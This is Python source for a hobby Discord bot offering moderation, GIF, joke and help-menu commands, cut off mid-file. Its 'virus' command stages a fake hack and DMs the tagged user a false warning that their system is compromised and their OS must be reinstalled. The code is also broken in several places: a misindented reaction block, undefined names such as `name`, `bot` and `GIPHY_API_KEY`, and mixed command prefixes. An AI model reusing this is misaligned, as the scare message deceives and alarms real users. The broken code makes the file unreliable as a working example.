import discord
from discord.ext import commands
from discord.ext.commands.cooldowns import BucketType
import asyncio
import colorsys
import random
import platform
from discord import Game, Embed, Color, Status, ChannelType
import os
import functools
import time
import datetime
import json
import aiohttp
from discord.voice_client import VoiceClient
from random import choice, shuffle

def is_owner(ctx):
     return ctx.message.author.id in ["551320853128806411","429301779981795338"]

def is_sahil(ctx):
    return ctx.message.author.id == "551320853128806411"

def is_staff(ctx):
    return ctx.message.author.id in ["463204987405860884", "442592011585978369", "420525168381657090"]

def is_DP(ctx):
    return ctx.message.author.id == "429301779981795338"
    
def is_BlueBird(ctx):
    return ctx.message.author.id == "455322915471097857"

client = commands.Bot(description="A bot made on Android", command_prefix="g!", pm_help = True)
client.remove_command('help')

@client.event
async def on_ready():
     print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
     print('the bot is ready')
     print('.......')
     print('created by GAMER SAHIL')
     client.loop.create_task(status_task())

async def status_task():
    while True:
        await client.change_presence(game=discord.Game(name='to g!help', type=2))
        await asyncio.sleep(5) 
        await client.change_presence(game=discord.Game(name=str(len(set(client.get_all_members())))+' users', type=3))
        await asyncio.sleep(4)
        await client.change_presence(game=discord.Game(name=str(len(client.servers))+' servers', type=3))
        await asyncio.sleep(4)
    
@client.event
async def on_reaction_add(reaction, user):
  if reaction.message.server is None:
      if reaction.emoji == '🇬':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.add_field(name = 'g!invite',value ='Use it to invite our bot to your server',inline = False)
        embed.add_field(name = 'g!happybday',value ='To wish anyone happy birthday use it like g!happybday @user',inline = False)
        embed.add_field(name = 'g!meme',value ='Use this command to get random memes.(Sometimes it sends same meme again and again)',inline = False)
        embed.add_field(name = 'g!ping',value ='Use this command to get pong.',inline = False)
        embed.add_field(name = 'g!virus',value ='A fake virus command use it like g!virus',inline = False)
        await client.send_message(user,embed=embed)
      if reaction.emoji == '🇲':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Moderation Commands Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'g!dm(Admin permission required) ',value ='Use it like ``g!dm @user <text>`` to dm user from bot',inline = False)
        embed.add_field(name = 'g!say(Admin permission required) ',value ='Use it like ``g!say <text>``',inline = False)
        embed.add_field(name = 'g!membercount(Kick members Permission Required) ',value ='Use it like ``g!membercount`` to get membercount',inline = False)
        embed.add_field(name = 'g!removemod(Admin Permission Required)',value ='Use it like ``g!removemod @user`` to remove him from mod. Note-You need Moderator role in your server below bot to use it.',inline = False)
        embed.add_field(name = 'g!makemod(Admin Permission Required)',value ='Use it like ``g!makemod @user`` to make him mod. Note-You need Moderator role in your server below darkbot to use it.',inline = False)
        embed.add_field(name = 'g!setnick(Manage nickname permission required)',value ='Use it like ``g!setnick @user <New nickname>`` to change the nickname of tagged user.',inline = False)
        embed.add_field(name = 'g!serverinfo(Kick members Permission Required) ',value ='Use it like ``g!serverinfo`` to get server info',inline = False)
        embed.add_field(name = 'g!userinfo(Kick members Permission Required) ',value ='Use it like ``g!userinfo @user`` to get some basic info of tagged user',inline = False)
        react_message = await client.send_message(user,embed=embed)
        reaction = '⏭'
        await client.add_reaction(react_message, reaction)
    
      if reaction.emoji == '⏭':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Moderation Commands Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'g!unbanall(Unban members Permission Required)',value ='Use it like ``g!unbanall`` to unban all members',inline = False)
        embed.add_field(name = 'g!kick(Kick members Permission Required)',value ='Use it like ``g!kick @user`` to kick any user',inline = False)
        embed.add_field(name = 'g!roles(Kick members Permission Required) ',value ='Use it to check roles present in server',inline = False)
        embed.add_field(name = 'g!purge(Manage Messages Permission Required)',value ='Use it like ``g!purge <number>`` to clear any message',inline = False)
        embed.add_field(name = 'g!mute(Mute members Permission Required)',value ='Use it like ``g!mute @user <time in minutes>`` to mute any user. **Note-You need to add Muted role in your server if it is not already there also you must need to change permission of all channels and disable send_message permission for Muted role.**',inline = False)
        embed.add_field(name = 'g!unmute(Mute members Permission Required) ',value ='Use it like ``g!unmute @user`` to unmute anyone',inline = False)
        embed.add_field(name = 'g!ban(Ban members Permission Required) ',value ='Use it like ``g!ban @user`` to ban any user',inline = False)
        embed.add_field(name = 'g!warn(Kick members Permission Required)',value ='Use it like ``g!warn @user <violation type>`` to warn any user',inline = False)
        react_message = await client.send_message(user,embed=embed)
        reaction = '⏮'
        await client.add_reaction(react_message, reaction)
    
      if reaction.emoji == '⏮':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Moderation Commands Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'g!announce(Admin Permission required) ',value ='To make bot announce anything using ``g!announce <channel> <msg>``. Note- It does not annoy people by tagging everyone or here.',inline = False)
        embed.add_field(name = 'g!dm(Admin permission required) ',value ='Use it like ``g!dm @user <text>`` to dm user from bot',inline = False)
        embed.add_field(name = 'g!say(Admin permission required) ',value ='Use it like ``g!say <text>``',inline = False)
        embed.add_field(name = 'g!membercount(Kick members Permission Required) ',value ='Use it like ``g!membercount`` to get membercount',inline = False)
        embed.add_field(name = 'g!removemod(Admin Permission Required)',value ='Use it like ``g!removemod @user`` to remove him from mod. Note-You need Moderator role in your server below bot to use it.',inline = False)
        embed.add_field(name = 'g!makemod(Admin Permission Required)',value ='Use it like ``g!makemod @user`` to make him mod. Note-You need Moderator role in your server below darkbot to use it.',inline = False)
        embed.add_field(name = 'g!setnick(Manage nickname permission required)',value ='Use it like ``g!setnick @user <New nickname>`` to change the nickname of tagged user.',inline = False)
        embed.add_field(name = 'g!serverinfo(Kick members Permission Required) ',value ='Use it like ``g!serverinfo`` to get server info',inline = False)
        embed.add_field(name = 'g!userinfo(Kick members Permission Required) ',value ='Use it like ``g!userinfo @user`` to get some basic info of tagged user',inline = False)
        react_message = await client.send_message(user,embed=embed)
        reaction = '⏭'
        await client.add_reaction(react_message, reaction)

if reaction.emoji == '🏵':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Setup Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'Setting up Welcomer log(Admin Permission required) ',value ='Use g!setupwelcomer. It will add a welcome channel. Just put that channel in your desired category and it will send all logs there.',inline = False)
        embed.add_field(name = 'Setting up GamerGod bot log(Admin Permission required) ',value ='Use ``g!setuplog`` and it will automatically add a log channel and log all stuffs there.',inline = False)
        await client.send_message(user,embed=embed)

      if reaction.emoji == '🎦':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Emoji Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'g!wow',value ='WOW emoji <a:WOW:515854429485006848>',inline = False)
        embed.add_field(name = 'g!cat',value ='Cat emoji <a:agooglecat:516174312294842389>',inline = False)
        embed.add_field(name = 'g!surprised',value ='Surprised emoji <a:eyebigger:516174315058626560>',inline = False)
        embed.add_field(name = 'g!angry',value ='Angry emoji <a:angear:516174316950388772>',inline = False)
        embed.add_field(name = 'g!fearfromme',value ='Scary emoji <a:shiroeglassespush:516174320532193289>',inline = False)
        embed.add_field(name = 'g!dank',value ='DankMemer emoji <a:OnThaCoco:515853700682743809>',inline = False)
        embed.add_field(name = 'g!thinking1',value ='Think emoji1 <a:thinking:516183328613990400>',inline = False)
        embed.add_field(name = 'g!thinking2',value ='Think emoji2 <a:thinking2:516183323127709699>',inline = False)
        embed.add_field(name = 'g!happy',value ='Happy emoji <a:happy:516183323052212236>',inline = False)
        embed.add_field(name = 'g!santa',value ='Santa emoji <a:santa:517232271678504970>',inline = False)
        embed.add_field(name = 'g!lol',value ='LoL emoji <a:lol:517232283670020096>',inline = False)
        embed.add_field(name = 'g!love',value ='Love emoji <a:love:517232300912672774>',inline = False)
        embed.add_field(name = 'g!mad',value ='Mad emoji <a:mad:517232301176913951>',inline = False)
        embed.add_field(name = 'g!alien',value ='Alien emoji <a:alien:517232332663422986>',inline = False)
        embed.add_field(name = 'g!hi',value ='Saying Hi emoji <a:hi:517232279148429313>',inline = False)
        await client.send_message(user,embed=embed)    
    
@client.event
async def on_message(message):
	await client.process_commands(message)
  
@client.command(pass_context = True)
async def help(ctx):
    if ctx.message.author.bot:
      return
    else:
      author = ctx.message.author
      r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
      embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
      embed.set_author(name='Help')
      embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
      embed.add_field(name = 'Having doubts? Join our server and clear your doubts. Server link:',value ='https://discord.gg/FrRtyS6',inline = False)
      embed.add_field(name = 'React with 🇲 ',value ='Explaines all the commands which are only usable by Those who has moderation permissions. Like- Manage Nicknames, Manage Messages, Kick/Ban Members,etc.',inline = False)
      embed.add_field(name = 'React with 🇬 ',value ='Explaines all the commands which are usable by everyone.',inline = False)
      embed.add_field(name = 'React with 🏵 ',value ='Explaines how to setup some stuffs like Giveaway feature and welcomer feature in your server',inline = False)
      embed.add_field(name = 'React with 🎦 ',value ='List of Nitro emojis that you can use',inline = False)
      dmmessage = await client.send_message(author,embed=embed)
      reaction1 = '🇲'
      reaction2 = '🇬'
      reaction3 = '🏵'
      reaction4 = '🎦'
      await client.add_reaction(dmmessage, reaction1)
      await client.add_reaction(dmmessage, reaction2)
      await client.add_reaction(dmmessage, reaction3)
      await client.add_reaction(dmmessage, reaction4)
      await client.say('📨 Check DMs For Information')

@client.command(pass_context = True)
async def ping(ctx):
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await client.send_typing(channel)
    t2 = time.perf_counter()
    await client.say("Ping: {}ms".format(round((t2-t1)*1000)))
    
@client.command(pass_context = True)
async def dm(ctx, user: discord.Member, *, msg: str):
   if user is None or msg is None:
       await client.say('Invalid args. Use this command like: ``n!dm @user message``')
   if ctx.message.author.server_permissions.administrator == False:
       await client.say('**You do not have permission to use this command**')
       return
   else:
       await client.send_message(user, msg)
       await client.delete_message(ctx.message)
       await client.say("Success! Your DM has made it! :white_check_mark: ")
       
@client.command(pass_context=True)
async def gifsearch(ctx, *keywords):
    if keywords:
        keywords = "+".join(keywords)
    else:
        await client.say('Invalid args')
        return
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title='Search Results for', description=f'{keywords}', color = discord.Color((r << 16) + (g << 8) + b))
    url = ("http://api.giphy.com/v1/gifs/search?&api_key={}&q={}"
           "".format(GIPHY_API_KEY, keywords))
    async with aiohttp.get(url) as r:
        result = await r.json()
        if r.status == 200:
            if result["data"]:
                embed.set_image(url=result["data"][0]["url"])
                embed.set_footer(text=f'Requested by: {ctx.message.author.display_name}', icon_url=f'{ctx.message.author.avatar_url}')
                embed.timestamp = datetime.datetime.utcnow()
                await client.say(embed=embed)
            else:
                await client.say("No results found.")
        else:
            await client.say("Error contacting the API")
            
@client.command(pass_context=True)
async def virus(ctx,user: discord.Member=None,*,hack=None):
    nome = ctx.message.author
    if not hack:
        hack = 'discord'
    else:
        hack = hack.replace(' ','_')
    channel = ctx.message.channel
    x = await client.send_message(channel, '``[▓▓▓                    ] / {}-virus.exe Packing files.``'.format(hack))
    await asyncio.sleep(1.5)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓                ] - {}-virus.exe Packing files..``'.format(hack))
    await asyncio.sleep(0.3)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {}-virus.exe Packing files...``'.format(hack))
    await asyncio.sleep(1.2)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {}-virus.exe Initializing code.``'.format(hack))
    await asyncio.sleep(1)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {}-virus.exe Initializing code..``'.format(hack))
    await asyncio.sleep(1.5)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {}-virus.exe Finishing.``'.format(hack))
    await asyncio.sleep(1)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {}-virus.exe Finishing..``'.format(hack))
    await asyncio.sleep(1)
    x = await client.edit_message(x,'``Successfully downloaded {}-virus.exe``'.format(hack))
    await asyncio.sleep(2)
    x = await client.edit_message(x,'``Injecting virus.   |``')
    await asyncio.sleep(0.5)
    x = await client.edit_message(x,'``Injecting virus..  /``')
    await asyncio.sleep(0.5)
    x = await client.edit_message(x,'``Injecting virus... -``')
    await asyncio.sleep(0.5)
    x = await client.edit_message(x,'``Injecting virus....\``')
    await client.delete_message(x)
    await client.delete_message(ctx.message)
        
    if user:
        await client.say('`{}-virus.exe` successfully injected into **{}**\'s system.'.format(hack,user.name))
        await client.send_message(user,'**Alert!**\n``You may have been hacked. {}-virus.exe has been found in your system\'s operating system.\nYour data may have been compromised. Please re-install your OS immediately.``'.format(hack))
    else:
        await client.say('**{}** has hacked himself ¯\_(ツ)_/¯.'.format(name.name))
        await client.send_message(name,'**Alert!**\n``You may have been hacked. {}-virus.exe has been found in your system\'s operating system.\nYour data may have been compromised. Please re-install your OS immediately.``'.format(hack))
        
@client.command(pass_context = True)
async def flipcoin(ctx):
    choices = ['Heads', 'Tails', 'Coin self-destructed']
    color = discord.Color(value=0x00ff00)
    em=discord.Embed(color=color, title='Flipped a coin!')
    em.description = random.choice(choices)
    await client.send_typing(ctx.message.channel)
    await client.say(embed=em)
    
@client.command(pass_context = True)
async def addrole(ctx,*, role:str=None):
    user = ctx.message.author
    if user.server_permissions.manage_roles == False:
        await client.say('**You do not have permission to use this command**')
        return
    if discord.utils.get(user.server.roles, name="{}".format(role)) is None:
        await client.create_role(user.server, name="{}".format(role), permissions=discord.Permissions.none())
        await client.say("{} role has been added.".format(role))
        return
    else:
        await client.say("{} role is already exists".format(role))
	
@client.command(pass_context = True)
async def delrole(ctx,*, role: discord.Role = None):
    user = ctx.message.author
    if discord.utils.get(ctx.message.server.roles, name="{}".format(role)) is None:
        await client.say("There is no role with this name in this server")
    if ctx.message.author.server_permissions.manage_roles == False:
        await client.say('**You do not have permission to use this command**')
        return
    else:
        await client.delete_role(ctx.message.server, role)
        await client.say(f"{role} role has been deleted")
        
@client.group(pass_context=True, invoke_without_command=True)
@commands.has_permissions(manage_nicknames=True)     
async def setnick(ctx, user: discord.Member=None, *, nickname=None):
    member = user.name
    if user is None:
      await client.say('Please tag a person to change nickname. Example- ``g!setnick @user/all <new nickname>``')
      return
    else:
      await client.change_nickname(user, nickname)
      await client.delete_message(ctx.message)
      for channel in user.server.channels:
        if channel.name == '╰☆☆-gamergod-log-☆☆╮':
            embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
            await client.send_message(channel, embed=embed)
            embed=discord.Embed(title="Changed Nickname of User!", description="**{0}** nickname was changed by **{1}**!".format(member, ctx.message.author), color=0x0521F6)
            await client.send_message(channel, embed=embed)
            
@client.command(pass_context = True)
@commands.has_permissions(manage_messages = True)
async def purge(ctx, number: int):
  purge = await client.purge_from(ctx.message.channel, limit = number+1)
  
@client.command(pass_context=True)
@commands.has_permissions(kick_members=True)
async def serverinfo(ctx):
    server = ctx.message.server
    roles = [x.name for x in server.role_hierarchy]
    role_length = len(roles)
    if role_length > 50: #Just in case there are too many roles...
        roles = roles[:50]
        roles.append('>>>> Displaying[50/%s] Roles'%len(roles))
    roles = ', '.join(roles);
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    online = len([m.status for m in server.members if m.status == discord.Status.online or m.status == discord.Status.idle])
    embed = discord.Embed(name="{} Server information".format(server.name), color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_thumbnail(url = server.icon_url)
    embed.add_field(name="Server name", value=server.name, inline=True)
    embed.add_field(name="Owner", value=server.owner.mention)
    embed.add_field(name="Server ID", value=server.id, inline=True)
    embed.add_field(name="Roles", value=len(server.roles), inline=True)
    embed.add_field(name="Members", value=len(server.members), inline=True)
    embed.add_field(name="Online", value=f"**{online}/{len(server.members)}**")
    embed.add_field(name="Created at", value=server.created_at.strftime("%d %b %Y %H:%M"))
    embed.add_field(name="Emojis", value=f"{len(server.emojis)}/100")
    embed.add_field(name="Server Region", value=str(server.region).title())
    embed.add_field(name="Total Channels", value=len(server.channels))
    embed.add_field(name="AFK Channel", value=str(server.afk_channel))
    embed.add_field(name="AFK Timeout", value=server.afk_timeout)
    embed.add_field(name="Verification Level", value=server.verification_level)
    embed.add_field(name="Roles {}".format(role_length), value = roles)
    await client.send_message(ctx.message.channel, embed=embed)
    
@client.command(pass_context=True)
@commands.has_permissions(kick_members=True)
async def membercount(ctx, *args):
    if ctx.message.channel.is_private:
        await bot.delete_message(ctx.message)
        return

    g = ctx.message.server

    gid = g.id
    membs = str(len(g.members))
    membs_on = str(len([m for m in g.members if not m.status == Status.offline]))
    users = str(len([m for m in g.members if not m.bot]))
    users_on = str(len([m for m in g.members if not m.bot and not m.status == Status.offline]))
    bots = str(len([m for m in g.members if m.bot]))
    bots_on = str(len([m for m in g.members if m.bot and not m.status == Status.offline]))
    created = str(g.created_at)

    em = Embed(title="Membercount")
    em.description =    "```\n" \
                        "Members:   %s (%s)\n" \
                        "  Users:   %s (%s)\n" \
                        "  Bots:    %s (%s)\n" \
                        "Created:   %s\n" \
                        "```" % (membs, membs_on, users, users_on, bots, bots_on, created)

    await client.send_message(ctx.message.channel, embed=em)
    await client.delete_message(ctx.message)
    
@client.command(pass_context = True)
async def happybday(ctx, *, msg = None):
    if not msg: await client.say("Please specify a user to wish")
    if '@here' in msg or '@everyone' in msg:
      return
    await client.say('Happy birthday ' + msg + ' \nhttps://asset.holidaycardsapp.com/assets/card/b_day399-22d0564f899cecd0375ba593a891e1b9.png')
    return
    
@client.command(pass_context=True)
async def slap(ctx, user: discord.Member = None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    gifs = ["http://rs20.pbsrc.com/albums/b217/strangething/flurry-of-blows.gif?w=280&h=210&fit=crop", "https://media.giphy.com/media/LB1kIoSRFTC2Q/giphy.gif", "https://i.imgur.com/4MQkDKm.gif"]
    if user == None:
        await client.say(f"{ctx.message.author.mention} ```Proper usage is\n\n>slap <mention a user>```")
    else:
        embed = discord.Embed(title=f"{ctx.message.author.name} slapped {user.name}!", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(gifs))
        await client.say(embed=embed)

@client.command(pass_context=True)
async def damn(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title="DAMNNNNNNNN!!", color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url="http://i.imgur.com/OKMogWM.gif")
    await client.say(embed=embed)
    await client.delete_message(ctx.message)
    
@client.command(pass_context=True)
async def burned(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url="https://i.imgur.com/wY4xbak.gif")
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def savage(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    gifs = ["https://media.giphy.com/media/s7eezS6vxhACk/giphy.gif", "https://m.popkey.co/5bd499/gK00J_s-200x150.gif",
            "https://i.imgur.com/XILk4Xv.gif"]
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url=random.choice(gifs))
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def thuglife(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    gifs = ["https://media.giphy.com/media/kU1qORlDWErOU/giphy.gif", "https://media.giphy.com/media/EFf8O7znQ6zRK/giphy.gif",
            "https://i.imgur.com/XILk4Xv.gif", "http://www.goodbooksandgoodwine.com/wp-content/uploads/2011/11/make-it-rain-guys.gif"]
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url=random.choice(gifs))
    await client.say(embed=embed)
    await client.delete_message(ctx.message)

@client.command(pass_context=True)
async def google(ctx, *, message):
    new_message = message.replace(" ", "+")
    url = f"https://www.google.com/search?q={new_message}"
    await client.say(url)
    
@client.command(pass_context=True)
async def rps(ctx, *, message=None):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    await client.send_typing(ctx.message.channel)
    ans = ["rock", "paper", "scissors"]
    pick=ans[random.randint(0, 2)]
    embed=discord.Embed(title = "Bot VS {}".format(ctx.message.author.name), color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_author(name = ctx.message.author.name, icon_url = ctx.message.author.avatar_url)
    if message is None:
        await client.say('Use it like ``n!rps rock or scissors or paper`` anyone of them to make this command work properly')
    if message.lower() != ans[0] and message.lower() != ans[1] and message.lower() != ans[2] :
        return await client.say("Pick Rock Paper or Scissors")
    elif message.lower() == pick:
        embed.add_field(name = "Its a draw!", value = "Bot picked {} too!".format(pick))
        return await client.say(embed=embed)
    else:
        if message.lower()  == "rock" and pick == "paper":
            embed.add_field(name = "Bot Wins!", value = "Bot picked {}!".format(pick))
            await client.say(embed=embed)
        elif message.lower()  == "rock" and pick == "scissors":
            embed.add_field(name = "{} Wins!".format(ctx.message.author.name), value = "Bot picked {}!".format(pick))
            await client.say(embed=embed)
        elif message.lower()  == "paper" and pick == "rock":
            embed.add_field(name = "{} Wins!".format(ctx.message.author.name), value = "Bot picked {}!".format(pick))
            await client.say(embed=embed)
        elif message.lower()  == "paper" and pick == "scissors":
            embed.add_field(name = "Bot Wins!", value = "Bot picked {}!".format(pick))
            await client.say(embed=embed)
        elif message.lower()  == "scissors" and pick == "rock":
            embed.add_field(name = "Bot Wins!", value = "Bot picked {}!".format(pick))
            await client.say(embed=embed)
        else:
            embed.add_field(name = "{} Wins!".format(ctx.message.author.name), value = "Bot picked {}!".format(pick))
            await client.say(embed=embed)
           
@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def announce(ctx, channel: discord.Channel=None, *, msg: str):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed=discord.Embed(title="Announcement", description="{}".format(msg), color = discord.Color((r << 16) + (g << 8) + b))
    await client.send_message(channel, embed=embed)
    await client.delete_message(ctx.message)
            
@client.command(pass_context=True)
@commands.has_permissions(kick_members=True)
async def kick(ctx,user:discord.Member):
    if user is None:
      await client.say('Please mention a member to kick. Example- ``n!kick @user``')
    if user.server_permissions.kick_members:
      await client.say('**He is mod/admin and i am unable to kick him/her**')
      return
    else:
      await client.kick(user)
      await client.say(user.name+' was kicked. Good bye '+user.name+'!')
      await client.delete_message(ctx.message)
      for channel in user.server.channels:
        if channel.name == 'server-log':
            embed=discord.Embed(title="User kicked!", description="**{0}** is kicked by **{1}**!".format(user, ctx.message.author), color=0xFDE112)
            await client.send_message(channel, embed=embed)
            
@client.command(pass_context=True)
async def kiss(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    randomurl = ["https://media3.giphy.com/media/G3va31oEEnIkM/giphy.gif", "https://i.imgur.com/eisk88U.gif", "https://media1.tenor.com/images/e4fcb11bc3f6585ecc70276cc325aa1c/tenor.gif?itemid=73863", "http://25.media.tumblr.com/6a0377e5cab1c8695f8f115b756187a8/tumblr_msbc5kC6uD1s9g6xgo1_500.gif", "https://assets.tumblr.com/images/x.gif", "https://66.media.tumblr.com/5f85ebb14dde21c41d4873bc2ec2918e/tumblr_oyr39no7iU1tty0zlo1_500.gif", "https://66.media.tumblr.com/a1a7fec7eb7b18c29b939ab00cd096db/tumblr_mulzefKWMm1sibpv8o1_500.gif" , "https://66.media.tumblr.com/befc3f8aa8e0de74004d314397799fac/tumblr_og2ac38IqO1u7esouo1_500.gif", "https://66.media.tumblr.com/d2a3329389610c80816d206d566c0927/tumblr_okc883Nfcl1w264geo1_540.gif"]                                                  
    if user.id == ctx.message.author.id:
        await client.say("Goodluck kissing yourself :joy: {}".format(ctx.message.author.mention))
    else:
        embed = discord.Embed(title=f"{user.name} You just got a kiss from {ctx.message.author.name}", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(randomurl))
        await client.say(embed=embed)

@client.command(pass_context=True)
async def hug(ctx, user: discord.Member):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    if user.id == ctx.message.author.id:
        await client.say("{} Wanted to hug himself/herself , good luck on that you will look like an idiot trying to do it".format(user.mention))
    else:
        randomurl = ["http://gifimage.net/wp-content/uploads/2017/09/anime-hug-gif-5.gif", "https://media1.tenor.com/images/595f89fa0ea06a5e3d7ddd00e920a5bb/tenor.gif?itemid=7919037", "https://media.giphy.com/media/NvkwNVuHdLRSw/giphy.gif"]
        embed = discord.Embed(title=f"{user.name} You just got a hug from {ctx.message.author.name}", color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_image(url=random.choice(randomurl))
        await client.say(embed=embed)

@client.command(pass_context=True)
async def joke(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    joke = ["What do you call a frozen dog?\nA pupsicle", "What do you call a dog magician?\nA labracadabrador", "What do you call a large dog that meditates?\nAware wolf", "How did the little scottish dog feel when he saw a monster\nTerrier-fied!", "Why did the computer show up at work late?\nBecause it had a hard drive", "Autocorrect has become my worst enime", "What do you call an IPhone that isn't kidding around\nDead Siri-ous", "The guy who invented auto-correct for smartphones passed away today\nRestaurant in peace", "You know you're texting too much when you say LOL in real life, instead of laughing", "I have a question = I have 18 Questions\nI'll look into it = I've already forgotten about it", "Knock Knock!\nWho's there?\Owls say\nOwls say who?\nYes they do.", "Knock Knock!\nWho's there?\nWill\nWill who?\nWill you just open the door already?", "Knock Knock!\nWho's there?\nAlpaca\nAlpaca who?\nAlpaca the suitcase, you load up the car.", "Yo momma's teeth is so yellow, when she smiled at traffic, it slowed down.", "Yo momma's so fat, she brought a spoon to the super bowl.", "Yo momma's so fat, when she went to the beach, all the whales started singing 'We are family'", "Yo momma's so stupid, she put lipstick on her forehead to make up her mind.", "Yo momma's so fat, even Dora can't explore her.", "Yo momma's so old, her breast milk is actually powder", "Yo momma's so fat, she has to wear six different watches: one for each time zone", "Yo momma's so dumb, she went to the dentist to get a bluetooth", "Yo momma's so fat, the aliens call her 'the mothership'", "Yo momma's so ugly, she made an onion cry.", "Yo momma's so fat, the only letters she knows in the alphabet are K.F.C", "Yo momma's so ugly, she threw a boomerang and it refused to come back", "Yo momma's so fat, Donald trump used her as a wall", "Sends a cringey joke\nTypes LOL\nFace in real life : Serious AF", "I just got fired from my job at the keyboard factory. They told me I wasn't putting enough shifts.", "Thanks to autocorrect, 1 in 5 children will be getting a visit from Satan this Christmas.", "Have you ever heard about the new restaurant called karma?\nThere's no menu, You get what you deserve.", "Did you hear about the claustrophobic astronaut?\nHe just needed a little space", "Why don't scientists trust atoms?\nBecase they make up everything", "How did you drown a hipster?\nThrow him in the mainstream", "How does moses make tea?\nHe brews", "A man tells his doctor\n'DOC, HELP ME. I'm addicted to twitter!'\nThe doctor replies\n'Sorry i don't follow you...'", "I told my wife she was drawing her eyebrows too high. She looked surprised.", "I threw a boomeranga a few years ago. I now live in constant fear"]
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.add_field(name=f"Here is a random joke that {ctx.message.author.name} requested", value=random.choice(joke))
    await client.say(embed=embed)

@client.command(pass_context = True)
async def rolldice(ctx):
    choices = ['1', '2', '3', '4', '5', '6']
    color = discord.Color(value=0x00ff00)
    em = discord.Embed(color=color, title='Rolled! (1 6-sided die)', description=random.choice(choices))
    await client.send_typing(ctx.message.channel)
    await client.say(embed=em)
    
@client.command(pass_context = True)
async def invite():
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_image(url="https://cdn.discordapp.com/icons/552129671022510081/abb5a016dfcbf31a16c774b85b602a21.webp?size=1024")
    embed.add_field(name = 'Link to invite me', value='https://discordapp.com/api/oauth2/authorize?client_id=553509385142403072&permissions=8&scope=bot')
    embed.add_field(name = 'bot info', value='Game God i made on android oh yeah made by Gamer Sahil')
    await client.say(embed=embed)
    await client.delete_message(ctx.message)
    
@client.command(pass_context = True)
